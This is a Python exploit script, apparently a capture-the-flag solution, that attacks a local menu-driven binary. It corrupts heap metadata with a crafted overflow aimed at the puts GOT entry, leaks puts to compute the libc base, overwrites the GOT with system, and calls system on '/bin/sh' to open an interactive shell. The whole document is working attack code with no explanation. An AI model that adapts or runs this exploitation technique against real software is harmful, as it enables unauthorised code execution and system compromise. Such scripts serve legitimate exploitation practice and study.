from zio import *
target  = './aa508d1df74d46a88bc02210c7f92824'
io      = zio(target, print_read = False, print_write = False, timeout = 100000)

def add_girl(typ):
    io.read_until('Your Choice:')
    io.writeline('1')
    io.read_until('Give the type of the Girl:')
    io.writeline(str(typ))

def del_girl(idx):
    io.read_until('Your Choice:')
    io.writeline('2')
    io.read_until('Give the Girl id to delete:')
    io.writeline(str(idx))

def edit_girl(idx, typ, girl):
    io.read_until('Your Choice:')
    io.writeline('3')
    io.read_until('Give the Girl id to edit:')
    io.writeline(str(idx))
    io.read_until('Give the type to edit:')
    io.writeline(str(typ))
    io.read_until('Give your Girl:')
    io.writeline(girl)

def show_girl(idx):
    io.read_until('Your Choice:')
    io.writeline('4')
    io.read_until('Give the Girlid to print:')
    io.writeline(str(idx))

got_puts    = 0x804b014
adr_buf     = 0x804b060

add_girl(1)
add_girl(2)
add_girl(1)
edit_girl(0, 2, 'A' * (0xe0 - 0xc) + l32(adr_buf - 8) + l32(got_puts))
edit_girl(2, 1, '/bin/sh\x00')
del_girl(1)
show_girl(0)
adr_puts = l32(io.read(5)[1:])

off_puts    = 0x00065650
off_system  = 0x00040190
adr_libc    = adr_puts - off_puts
adr_system  = adr_libc + off_system

print '[+] libc base : {}'.format(hex(adr_libc))

edit_girl(0, 1, l32(adr_system))

io.writeline('4')
io.writeline('2')

io.interact()
